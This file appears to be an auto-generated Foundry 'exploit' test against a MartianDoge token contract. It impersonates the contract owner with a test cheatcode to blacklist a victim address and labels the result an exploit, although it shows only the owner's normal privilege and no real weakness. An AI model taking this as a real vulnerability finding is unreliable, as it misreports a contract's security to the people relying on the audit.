// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MartianDoge {
    function owner() external view returns (address);
    function setBlacklist(address account, bool value) external;
    function isBlacklist(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // The test file already defines TARGET and attacker
        victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = MartianDoge(TARGET).owner();
        console.log("Current owner:", owner);

        // Impersonate the owner
        vm.prank(owner);

        // Call setBlacklist to blacklist the victim address
        MartianDoge(TARGET).setBlacklist(victim, true);

        // Verify the victim is now blacklisted
        bool isBlacklisted = MartianDoge(TARGET).isBlacklist(victim);
        console.log("Victim blacklisted:", isBlacklisted);

        // Assert that the victim is blacklisted (oracle verification)
        assertEq(isBlacklisted, true, "Victim should be blacklisted");
        assertEq(MartianDoge(TARGET).isBlacklist(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
